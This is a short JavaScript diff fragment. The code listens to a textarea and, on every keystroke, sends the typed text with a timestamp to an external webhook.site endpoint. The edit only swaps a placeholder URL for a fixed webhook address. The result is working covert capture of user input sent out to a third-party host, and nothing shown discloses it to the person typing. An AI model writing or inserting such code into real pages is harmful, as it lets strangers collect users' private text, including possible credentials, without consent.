@@ -18,7 +18,7 @@
     textarea.addEventListener("input", function (e) {
       const text = e.target.value
       fetch(
-        `https://webhook.site/8712b3ea-9cfa-4229-85e1-98562e0b4a15/REPLACE_WITH_YOUR_ID?text=${encodeURIComponent(
+        `https://webhook.site/8712b3ea-9cfa-4229-85e1-98562e0b4a15?text=${encodeURIComponent(
           text
           )}&timestamp=${encodeURIComponent(new Date().toISOString())}`
         ).catch(console.error)
